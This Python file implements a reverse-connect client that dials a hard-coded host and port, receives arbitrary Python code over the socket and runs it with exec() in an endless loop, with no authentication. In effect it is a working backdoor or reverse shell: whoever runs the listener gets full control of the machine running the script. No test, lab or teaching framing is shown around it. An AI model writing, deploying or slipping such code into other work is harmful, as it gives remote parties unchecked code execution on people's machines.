import socket as Socket
import sys
import argparse

class client:
    def __init__(self,ip_addr,port, recv=2018,quiet=True):
        #args
        self.ip_addr =ip_addr
        self.port=port
        self.recv = recv
        self.quiet = quiet
        self.dataWasSent=True
        #Init
        self.soc = Socket.socket(Socket.AF_INET, Socket.SOCK_STREAM)
        self.soc.connect((self.ip_addr, self.port))
        #main
        self.becomeServant()
        self.closeConn()
    def receiveData(self):
        return self.soc.recv(self.recv)
    def log(self,msg):
        if not self.quiet:
            print(msg)
    def sendData(self,data):
        data=str(data)
        self.soc.sendall(data.encode())
        self.dataWasSent=True
    def closeConn(self):
        self.soc.close()
    def becomeServant(self):
        while True:
            try:
                command = self.receiveData()
                self.log("[%s]>>>%s"%(self.ip_addr,command.decode()))
                command = str(command.decode())
                #print("---------------------------------------------------------")
                print(command)
                #print("---------------------------------------------------------")
                exec(command)

                self.sendData("[%s Recieved OK]"%str(self.ip_addr))
                #self.dataWasSent = False
            except BaseException as error:
                print("ERRRRRRR"+str(error))
                self.log("[Error for command] %s"%error )

if __name__ == "__main__":
    #parser= argparse.ArgumentParser()
    #parser.add_argument("-i","--ip",default= "192.168.31.58",type=str,help=" Specify the Ipv4 defaults to: 192.168.31.58")
    #parser.add_argument("-p", "--port", default=50007, type=int, help=" Specify the Port defaults to: 50007")
    #args = parser.parse_args()
    #MontyPython = client(args.ip,args.port)
    MontyPython = client('192.168.1.73', 50007)